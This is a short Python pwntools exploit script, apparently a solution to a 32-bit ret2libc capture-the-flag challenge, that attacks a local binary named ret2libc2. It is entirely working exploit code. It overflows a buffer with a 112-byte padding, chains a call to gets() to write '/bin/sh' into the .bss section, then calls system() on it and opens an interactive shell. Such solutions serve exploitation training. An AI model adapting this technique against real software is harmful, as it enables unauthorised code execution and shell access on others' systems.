#Made by fly_autumn
#ret2libc x32
from pwn import *
p = process("./ret2libc2")
elf = ELF("./ret2libc2")
offset = 112
sys_addr = 0x8048490
gets_addr = 0x8048460
bss_addr = 0x804a080
payload = b"\x00" * offset + p32(gets_addr) + p32(sys_addr) + p32(bss_addr) + p32(bss_addr)
p.sendline(payload)
p.sendline(b"/bin/sh\n")
p.interactive()
